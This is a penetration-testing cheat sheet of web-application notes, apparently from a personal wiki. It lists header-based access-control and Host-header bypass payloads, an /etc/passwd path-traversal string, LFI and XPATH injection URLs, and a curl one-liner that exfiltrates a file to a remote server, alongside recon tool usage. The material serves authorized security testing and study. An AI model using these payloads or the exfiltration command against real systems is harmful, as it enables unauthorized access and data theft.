---
description: >-
  TODO: Need to pull web notes out of the OS Agnostic section (and then rename
  that to something better!)
---

# Web Notes

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## Headers

### HTTP Authorization headers

```bash
# Basic Auth (Base64)
Authorization: Basic AXVubzpwQDU1dzByYM==

# Bearer Token (JWT)
Authorization: Bearer <token>

# API Key
GET /endpoint?api_key=abcdefgh123456789
X-API-Key: abcdefgh123456789

# Digest Auth
Authorization: Digest username=”admin” Realm=”abcxyz” nonce=”474754847743646”, uri=”/uri” response=”7cffhfr54685gnnfgerg8”

# OAuth2.0
Authorization: Bearer hY_9.B5f-4.1BfE

# Hawk Authentication
Authorization: Hawk id="abcxyz123", ts="1592459563", nonce="gWqbkw", mac="vxBCccCutXGV30gwEDKu1NDXSeqwfq7Z0sg/HP1HjOU="

# AWS signature
Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east-1/execute-api/aws4_
```

### HTTP Security Headers

1. [X-Frame-Options](https://www.netsparker.com/whitepaper-http-security-headers/#XFrameOptionsHTTPHeader)
2. [X-XSS-Protection](https://www.netsparker.com/whitepaper-http-security-headers/#XXSSProtectionHTTPHeader)
3. [X-Content-Type-Options](https://www.netsparker.com/whitepaper-http-security-headers/#XContentTypeOptionsHTTPHeader)
4. [X-Download-Options](https://www.netsparker.com/whitepaper-http-security-headers/#XDownloadOptionsHTTPHeader)
5. [Content Security Policy \(CSP\)](https://www.netsparker.com/whitepaper-http-security-headers/#ContentSecurityPolicyHTTPHeader)
6. [HTTP Strict Transport Security \(HSTS\)](https://www.netsparker.com/whitepaper-http-security-headers/#HTTPStrictTransportSecurityHSTSHTTPHeader)
7. [HTTP Public Key Pinning](https://www.netsparker.com/whitepaper-http-security-headers/#HTTPPublicKeyPinning)
8. [Expect-CT](https://www.netsparker.com/whitepaper-http-security-headers/#ExpectCTHTTPHeader)
9. [Referrer-Policy](https://www.netsparker.com/whitepaper-http-security-headers/#ReferrerPolicyHTTPHeader)

* [https://www.netsparker.com/whitepaper-http-security-headers/](https://www.netsparker.com/whitepaper-http-security-headers/)
* [https://owasp.org/www-project-secure-headers/](https://owasp.org/www-project-secure-headers/)

### Header Bypass Methods

```bash
# Add something like 127.0.0.1, localhost, 192.168.1.2, target.com or /admin, /console
Client-IP:
Connection:
Contact:
Forwarded:
From:
Host:
Origin:
Referer:
True-Client-IP:
X-Client-IP:
X-Custom-IP-Authorization:
X-Forward-For:
X-Forwarded-For:
X-Forwarded-Host:
X-Forwarded-Server:
X-Host:
X-Original-URL:
X-Originating-IP:
X-Real-IP:
X-Remote-Addr:
X-Remote-IP:
X-Rewrite-URL:
X-Wap-Profile:

# Try to repeat same Host header 2 times
Host: legit.com
Stuff: stuff
Host: evil.com

# Bypass type limit
Accept: application/json, text/javascript, */*; q=0.01
Accept: ../../../../../../../../../etc/passwd{{'

# Try to change the HTTP version from 1.1 to HTTP/0.9 and remove the host header

# 401/403 bypasses 
# Whitelisted IP 127.0.0.1 or localhost
Client-IP: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For: localhost
Forwarded: 127.0.0.1
Forwarded: localhost
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forward: 127.0.0.1
X-Forward: localhost
X-Forwarded-By: 127.0.0.1
X-Forwarded-By: localhost
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For-Original: localhost
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-Server: 127.0.0.1
X-Forwarded-Server: localhost
X-Forwarded: 127.0.0.1
X-Forwarded: localhost
X-Forwared-Host: 127.0.0.1
X-Forwared-Host: localhost
X-Host: 127.0.0.1
X-Host: localhost
X-HTTP-Host-Override: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-Addr: localhost
X-Remote-IP: 127.0.0.1

# Fake Origin - make GET request to accesible endpoint with:
X-Original-URL: /admin
X-Override-URL: /admin
X-Rewrite-URL: /admin
Referer: /admin
# Also try with absolute url https:/domain.com/admin

# Method Override
X-HTTP-Method-Override: PUT

# Provide full path GET
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com

# Add line wrapping
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
```

## Cookies

* [https://cookiepedia.co.uk/](https://cookiepedia.co.uk/)
  * "Largest Database of Pre-Categorized Cookies"
  * Scans a website for cookie usage

### JavaScript

```bash
# can pair with alert();
document.cookie; 
```

### Ruby

```ruby
# Use HTTP::Cookie library <https://github.com/sparklemotion/http-cookie>
# Following examples were taken from the readme.md from above repository

## One cookie
	cookie = HTTP::Cookie.new("uid", "u12345", domain: 'example.org',
						   for_domain: true,
						   path: '/',
						   max_age: 7 * 86400)
	header['Set-Cookie'] = cookie.set_cookie_value
	
	## Several cookies
	jar = HTTP::CookieJar.new
	jar.load(filename) if File.exist?(filename)
	header["Set-Cookie"].each { |value| jar.parse(value, uri) }
	header["Cookie"] = HTTP::Cookie.cookie_value(jar.cookies(uri))
```

### Python2

```bash
# python has a cookie library!
# Following example taken from the python documentation

import cookielib, urllib2
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
r = opener.open("http://example.com/")
```

### Edit cookies in chrome

Settings -&gt; Advanced Settings -&gt; Privacy -&gt; Content -&gt; Cookies

or "Edit This Cookie" plugin



### Edit cookies in firefox

Preferences -&gt; Privacy -&gt; Show Cookies

or "Cookies Manager+" addon

## Local File Inclusion \(LFI\) / Remote File Inclusion \(RFI\)

Common and/or useful files to check for when exploiting Local File Inclusion \(for both Linux and Windows\): [https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI](https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI)

### LFI - Retrieve HTML/PHP files without executing

```text
https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

## OpenVAS Vulnerability Scanner

```bash
#Install openvas
apt update
apt install openvas

#Run the setup script
openvas-setup

#Check that it is running on port 939
netstat -tulpn

#Login by using a browser and navigating to: https://127.0.0.1:939
```

## Misc

### XPATH Dump

```text
https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
```

whatismybrowser.com - research User-Agent strings

Use `curl` to exfiltrate file on remote server \(from attackers box\): `curl -d @/<file> <remote server>`

in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)

vulnerability testing for webdav \(or other file upload vulns!\): `davtest`

bypassing filetype filters with http MOVE command to rename allowed filetype [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)

Wordpress enumeration: `wpscan -u <url> [--disable-tls-checks]`

pull Google cached webpage if regular site not loading: `cache:https://<somewebsite>`

Virtual Host Routing: substitute IP for hostname to get different results

### 

hydra against http wordpress login walkthrough: [IppSec:HacktheBox - Apocalyst](https://www.youtube.com/watch?v=TJVghYBByIA)

web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)

Web site "flyover" surveillance: [Aquatone](https://github.com/michenriksen/aquatone) "is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface" - from the author \(see link\). Visual dirbuster?

### Crawl web pages for keywords - useful for password/vhost enumeration lists

```bash
# To spider a site and write all found words to a file
cewl -w <file> <url>

# To spider a site and follow links to other sites
cewl -o <url>

# To spider a site using a given user-agent 
cewl -u <user-agent> <url>

# To spider a site for a given depth and minimum word length
cewl -d <depth> -m <min word length> <url>

# To spider a site and include a count for each word
cewl -c <url>

# To spider a site inluding meta data and separate the meta_data words
cewl -a -meta_file <file> <url>

# To spider a site and store email adresses in a separate file
cewl -e -email_file <file> <url>
```

### Common checks

```bash
# robots.txt
curl http://example.com/robots.txt

# headers
wget --save-headers http://www.example.com/
    # Strict-Transport-Security (HSTS)
    # X-Frame-Options: SAMEORIGIN
    # X-XSS-Protection: 1; mode=block
    # X-Content-Type-Options: nosniff

# Cookies
    # Check Secure and HttpOnly flag in session cookie
    # If you find a BIG-IP cookie, app is behind a load balancer

# SSL Ciphers
nmap --script ssl-enum-ciphers -p 443 www.example.com

# HTTP Methods
nmap -p 443 --script http-methods www.example.com

# Cross Domain Policy
curl http://example.com/crossdomain.xml
    # allow-access-from domain="*"
```





If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!

